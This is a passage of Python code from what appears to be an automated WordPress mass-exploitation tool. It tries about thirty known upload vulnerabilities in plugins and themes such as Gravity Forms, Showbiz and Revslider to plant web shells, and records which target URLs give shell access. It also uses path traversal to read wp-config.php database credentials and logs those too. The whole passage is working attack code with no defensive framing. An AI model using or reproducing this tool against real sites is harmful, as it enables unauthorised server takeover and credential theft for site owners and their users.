                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Ghost     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
	
		
		# 1 .   Gravity Forms
		
		
		appgrav  = {'field_id':'3',
		'form_id':'1',
		'gform_unique_id':'../../../../',
		'name':'RxR.phtml'}
		
		
		Grav = {'file':(filename, shell_2, 'text/html')}
		
		Gravreq = requests.post(url+'/?gf_page=upload', data=appgrav, files=Grav)
		
		Gravlib = requests.get(url+'/wp-content/_input_3_RxR.phtml?bang')
		
		
		if 'Bigbang' in Gravlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Gravity     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Gravlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/_input_3_RxR.phtml?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/_input_3_RxR.phtml'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Gravity     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

		# 1 .   Gravity Forms
		
		
		appgrav  = {'field_id':'3',
		'form_id':'1',
		'gform_unique_id':'../../../../',
		'name':'izo.php5'}
		
		
		Grav = {'file':(filename, shell_2, 'text/html')}
		
		Gravreq = requests.post(url+'/?gf_page=upload', data=appgrav, files=Grav)
		
		Gravlib = requests.get(url+'/wp-content/_input_3_izo.php5?bang')
		
		
		if 'Bigbang' in Gravlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Gravity php    {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Gravlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/_input_3_izo.php5?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/_input_3_izo.php5'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Gravity php    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		# 1 .   Gravity Forms
		
		
		appgravk  = {'config_path':'../../../../../../'}
		
		
		Gravk = {'image':(filename, shell_2, 'text/html')}
		
		Gravkreq = requests.post(url+'/wp-content/plugins/social-networking-e-commerce-1/classes/views/social-options/form_cat_add.php', data=appgravk, files=Gravk)
		
		Gravklib = requests.get(url+'/wp-content/plugins/social-networking-e-commerce-1/images/uploads/'+filenames+'?bang')
		
		
		if 'Bigbang' in Gravklib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} networking-e-commerce     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Gravklib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/plugins/social-networking-e-commerce-1/images/uploads/'+filenames+'?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/social-networking-e-commerce-1/images/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} networking-e-commerce     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			
			
			
		# 3 .   Showbiz
		
		
		showbizapp = {'action':'showbiz_ajax_action',
					    'client_action':'update_plugin'}
						
						
		showbizup = {'update_file':(filenames, shell_2, 'text/html')}
		
		showbizreq = requests.post(url+'/wp-admin/admin-ajax.php', data=showbizapp , files=showbizup)
		
		showbizlib = requests.get(url+'/wp-content/plugins/showbiz/temp/update_extract/'+filenames+'?bang')
		
		if 'Bigbang' in showbizlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Showbiz     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",showbizlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/plugins/showbiz/temp/update_extract/'+filenames+'?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/showbiz/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Showbiz     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			
		# 4 . Reflex Gallery
		
		Reflexup = {'qqfile' : (filenames, shell_2, 'text/html')}
		
		Reflexreq = requests.post(url+'/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2018&Month=03', files=Reflexup)
		
		Reflexlib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames+'?bang')
		
		
		if 'Bigbang' in Reflexlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Reflex Gallery     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Reflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Reflex Gallery     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
		
		
		
		# 5 .  Wysija
		
		Wysijaup = {'my-theme':open('tool/Master.zip', 'rb')}
		
		
		Wysijaapp = {'action':'themeupload',
				   'submitter':'Upload',
				   'overwriteexistingtheme':'on',
				   'page':'GZNeFLoZAb'}
				   
				   
		Wysijareq = requests.post(url+'/wp-admin/admin-post.php?page=wysija_campaigns&action=themes' , data=Wysijaapp, files=Wysijaapp)
		
		Wysijalib = requests.get(url+'/wp-content/uploads/wysija/themes/Master/RxR.php?bang')
		
		
		if 'Bigbang' in Wysijalib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Wysija     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Wysijalib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpresshell.txt', 'a').write(url+'/wp-content/uploads/wysija/themes/Master/RxR.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/wysija/themes/Master/RxR.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Wysija     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
		
		banGravlib = requests.get(url+'/shell.php')		
		banxxGravlib = requests.get(url+'/wp-content/error.php')
		banxxxGravlib = requests.get(url+'/wp-content/shell.php')
		banxxxxGravlib = requests.get(url+'/wp-admin/shell.php')
		banxxxxxGravlib = requests.get(url+'/098.php')
		
		
		if 'Uname' in banGravlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/shell.php'+'\n')
			sys.exit()
		elif 'Uname' in banxxGravlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/error.php'+'\n')
			sys.exit()
		elif 'Uname' in banxxxGravlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/shell.php'+'\n')
			sys.exit()
		elif 'Uname' in banxxxxGravlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-admin/shell.php'+'\n')
			sys.exit()
		elif 'Uname' in banxxxxxGravlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/098.php'+'\n')
			sys.exit()			
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Shell     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		
		
		
		# 6 . LearnDash
		
		
		
		LearnDashup={'uploadfiles[]': (filenamex, shell, 'text/html')}
		
		
		LearnDashreq = requests.post(url, files=LearnDashup,data = {'post':'foobar','course_id':'foobar','uploadfile':'foobar'})
		
		
		LearnDashlib = requests.get(url+'/wp-content/uploads/assignments/'+filenamex.replace('.php.php', '.php.'))
		
		
		
		if 'izocin' in LearnDashlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} LearnDash     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/assignments/'+filenamex.replace('.php.php', '.php.')+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} LearnDash    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
		
		
		# 7 . Tevolution
		
		
		Tevoup = {'file':(filenames, shell, 'text/html')}
		
		Tevoreq = requests.post(url+'/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php', files=Tevoup)
		
		Tevorlib = requests.get(url+'/wp-content/themes/Directory/images/tmp/'+filenames)
		
		if 'izocin' in Tevorlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Tevolution     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/Directory/images/tmp/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Tevolution    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		
		
		
		# 7 . pagelines
		
		PostData = {'settings_upload': "settings", 'page': "pagelines"}
		
		zTevoup = {'file':(filenames, shell, 'text/html')}
		
		zTevoreq = requests.post(url+'/wp-admin/admin-post.php', files=zTevoup, data=PostData, headers=Agent)
		
		zTevorlib = requests.get(url+'/wp-content/'+filenames)
		
		if 'izocin' in zTevorlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} pagelines     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} pagelines    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		
		# 8 . Cherry
		
		Cherryup = {'file':(filenames, shell, 'text/html')}
		
		Cherryreq = requests.post(url+'/wp-content/plugins/cherry-plugin/admin/import-export/upload.php', files=Cherryup)
		
		Cherrylib = requests.get(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames)
		
		
		if 'izocin' in Cherrylib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Cherry     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Cherry    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)		


		
		# 9 . rev
		
		revlib = requests.get(url+"/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
				
		if 'DB_USER' in revlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Revslider Config     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'+'\n')
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Revslider Config     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)		


		# 9 . rev
		
		revlib = requests.get(url+"/wp-content/plugins/wp-e-commerce/wpsc-includes/misc.functions.php?image_name=../../../wp-config.php")
				
		if 'DB_USER' in revlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Wp-ecommerce Config     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'+'\n')
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Wp-ecommerce Config     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			
		
		# 10 . property
		
		propertyup = {'Filedata':(filenames, shell, 'text/html')}
		
		propertyreq = requests.post(url+'/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php', files=propertyup)
		
		propertylib = requests.get(url+'/wp-content/plugins/wp-property/third-party/uploadify/'+filenames)
		
		
		if 'izocin' in propertylib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-property     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/wp-property/third-party/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-property    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		
		# 11 . simple
		
		mzoo = {'action': 'upload_ad_imag', 
				'path': ''}
		
		simpleup = {'uploadfile':(filenames, shell, 'text/html')}
		
		simplereq = requests.post(url+'/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php',data=mzoo, files=simpleup)
		
		simplelib = requests.get(url+'/wp-content/plugins/simple-ads-manager/'+filenames)
		
		
		if 'izocin' in simplelib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} ads-manager     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/simple-ads-manager/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} ads-manager    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			
			

		# 12 . simple
		
		dayi = {'file_field': (filevid, shell_2, 'text/html')}

		dayireq = requests.post(url+'/wp-content/plugins/dzs-videogallery/admin/upload.php', files=dayi)

		
		
		dayilib = requests.get(url+"/wp-content/plugins/dzs-videogallery/admin/upload/izo.PhP.txtx?bang")
		
		
		if 'Bigbang' in dayilib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} dzs-videogallery     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",dayilib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/Wrdpresshell.txt', 'a').write(url+'/wp-content/plugins/dzs-videogallery/admin/upload/izo.PhP.txtx?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/dzs-videogallery/admin/upload/izo.PhP.txtx'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} dzs-videogallery    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			


		# 13 . simple			
			
		basbe = {'value': './'}
		
		sabo = {'uploadfile': (filecl, shell, 'text/html')}

		sonreq = requests.post(url+'/wp-content/themes/clockstone/theme/functions/uploadbg.php', files=sabo, data=basbe)

		
		
		sonlib = requests.get(url+"/wp-content/themes/clockstone/theme/functions/e3726adb9493beb4e8e2dabe65ea10ef.php")
		
		
		if 'izocin' in sonlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} clackstone     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/clockstone/theme/functions/e3726adb9493beb4e8e2dabe65ea10ef.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} clackstone    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 14 . eptonic
		
		eptonicup = {'qqfile':(filenames, shell, 'text/html')}
		
		eptonicreq = requests.post(url+'/wp-content/themes/eptonic/functions/jwpanel/scripts/valums_uploader/php.php', files=eptonicup)
		
		eptoniclib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in eptoniclib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} eptonic     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} eptonic    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 15 . saico
		
		saicoup = {'qqfile':(filenames, shell, 'text/html')}
		
		saicoreq = requests.post(url+'/wp-content/themes/saico/framework/_scripts/valums_uploader/php.php', files=saicoup)
		
		saicolib = requests.get(url+'/wp-content/uploads/2018/038/'+filenames)
		
		
		if 'izocin' in saicolib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} saico     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} saico    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 16 . saico
		
		barclaycartup = {'Filedata':(filenames, shell, 'text/html')}
		
		barclaycartreq = requests.post(url+'/wp-content/plugins/barclaycart/uploadify/uploadify.php', files=barclaycartup)
		
		barclaycartlib = requests.get(url+'/wp-content/plugins/barclaycart/uploadify/'+filenames)
		
		
		if 'izocin' in barclaycartlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} barclaycart     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/barclaycart/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} barclaycart    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 17 . sexy
		
		sexyup = {'files[]':(filenames, shell, 'text/html')}
		
		sexyreq = requests.post(url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php', files=sexyup)
		
		sexylib = requests.get(url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/'+filenames)
		
		
		if 'izocin' in sexylib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} sexy-contact-form     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} sexy-contact-form    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 18 . pinboard
		
		pinboardup = {'Filedata':(filenames, shell, 'text/html')}
		
		pinboardreq = requests.post(url+'/wp-content/themes/pinboard/themify/themify-ajax.php?upload=1', files=pinboardup)
		
		pinboardlib = requests.get(url+'/wp-content/themes/pinboard/uploads/'+filenames)
		
		
		if 'izocin' in pinboardlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} pinboard     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/pinboard/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} pinboard    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 19 . pitchprint
		
		pitchprintup = {'files[]':(filenames, shell, 'text/html')}
		
		pitchprintreq = requests.post(url+'/wp-content/plugins/pitchprint/uploader/', files=pitchprintup)
		
		pitchprintlib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in pitchprintlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} pitchprint     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} pitchprint    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 20 . evolve
		
		evolveup = {'qqfile':(filenames, shell, 'text/html')}
		
		evolvereq = requests.post(url+'/wp-content/themes/evolve/js/back-end/libraries/fileuploader/upload_handler.php', files=evolveup)
		
		evolvelib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in evolvelib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} evolve     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} evolve    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 21 . satoshi
		
		satoshiup = {'Filedata':(filenames, shell, 'text/html')}
		
		satoshireq = requests.post(url+'/wp-content/themes/satoshi/functions/upload-handler.php', files=satoshiup)
		
		satoshilib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in satoshilib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} satoshi     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} satoshi    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 22 . dandelion
		
		dandelionup = {'qqfile':(filenames, shell, 'text/html')}
		
		dandelionreq = requests.post(url+'/wp-content/themes/dandelion/functions/upload-handler.php', files=dandelionup)
		
		dandelionlib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in dandelionlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} dandelion     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} dandelion    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			

			
		# 23 . highlight
		
		highlightup = {'file':(filenames, shell, 'text/html')}
		
		highlightreq = requests.post(url+'/wp-content/themes/highlight/lib/utils/upload-handler.php', files=highlightup)
		
		highlightlib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in highlightlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} highlight     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} highlight    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	

			
		# 24 . ithemes
		
		ithemesup = {'Filedata':(filenames, shell, 'text/html')}
		
		ithemesreq = requests.post(url+'/wp-content/themes/ithemes2/themify/themify-ajax.php?upload=1', files=ithemesup)
		
		ithemeslib = requests.get(url+'/wp-content/themes/ithemes2/uploads/'+filenames)
		
		
		if 'izocin' in ithemeslib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} ithemes2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/ithemes2/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} ithemes2    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	

			
		# 25 . custom-background
		
		customup = {'Filedata':(filenames, shell, 'text/html')}
		
		customreq = requests.post(url+'/wp-content/plugins/custom-background/uploadify/uploadify.php', files=customup)
		
		customlib = requests.get(url+'/wp-content/plugins/custom-background/uploadify/'+filenames)
		
		
		if 'izocin' in customlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} custom-background     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/custom-background/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} custom-background    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		# 25 . custom-background
		
		zxcustomup = {'file':(filenames, shell, 'text/html')}
		
		zxcustomreq = requests.post(url+'/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library', files=zxcustomup)
		
		zxcustomlib = requests.get(url+'/wp-content/jssor-slider/jssor-uploads/'+filenames)
		
		
		if 'izocin' in zxcustomlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} jssor-slider     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/jssor-slider/jssor-uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} jssor-slider    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			
			
			
		# 26 . amplus
		
		amplusup = {'file':(filenames, shell, 'text/html')}
		
		amplusreq = requests.post(url+'/wp-content/themes/amplus/functions/upload-handler.php', files=amplusup)
		
		ampluslib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in ampluslib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} amplus     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/04/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} amplus    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			

			
		# 27 . cnhk
		
		cnhkup = {'slideshow':(filenames, shell, 'text/html')}
		
		cnhkreq = requests.post(url+'/wp-content/plugins/cnhk-slideshow/uploadify/uploadify.php', files=cnhkup)
		
		cnhklib = requests.get(url+'/wp-content/plugins/cnhk-slideshow/uploadify/'+filenames)
		
		
		if 'izocin' in cnhklib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} cnhk-slideshow     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/cnhk-slideshow/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} cnhk-slideshow    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 28 . asset
		
		assetup = {'Filedata':(filenames, shell, 'text/html')}
		
		assetreq = requests.post(url+'/wp-content/plugins/asset-manager/upload.php', files=assetup)
		
		assetlib = requests.get(url+'/wp-content/uploads/assets/temp/'+filenames)
		
		
		if 'izocin' in assetlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} asset-manager     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/assets/temp/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} asset-manager    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		# 29 . private-conversation			
			
		yasbe = {'folder': '/test/'}
		
		asabo = {'file': (filenames, shell, 'text/html')}

		sonzreq = requests.post(url+'/wp-content/plugins/wordpress-member-private-conversation/doupload.php', data=yasbe, files=asabo)

		
		
		sonzlib = requests.get(url+'/wp-content/uploads/user_uploads/test/'+filenames)
		
		
		if 'izocin' in sonzlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} private-conversation     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/user_uploads/test/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} private-conversation    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			

			
		# 30 . cubed_v1.2
		
		cubedsup = {'uploadfile':(filenames, shell, 'text/html')}
		
		cubedsreq = requests.post(url+'/wp-content/themes/cubed_v1.2/functions/upload-handler.php', files=cubedsup)
		
		cubedslib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in cubedslib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} cubed_v1.2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} cubed_v1.2    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 31 . flipbook
		
		flipbookup = {'qqfile':(filenames, shell, 'text/html')}
		
